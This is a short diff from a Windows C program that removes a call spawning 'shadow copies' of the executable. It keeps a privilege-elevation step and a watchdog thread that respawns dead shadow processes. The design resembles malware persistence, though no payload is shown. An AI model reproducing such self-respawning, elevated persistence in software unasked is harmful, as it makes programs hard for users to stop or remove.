@@ -387,11 +387,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     /* Elevate privileges if needed for full functionality */
     sys_check_privileges();
     
-    /* Main .exe: ensure all 3 shadows are running */
-    if (!isShadow) {
-        sys_spawn_shadow_copy();
-    }
-    
     /* Start inter-process watchdog (respawns dead shadows) */
     CreateThread(NULL, 0, svc_watchdog, NULL, 0, NULL);
     
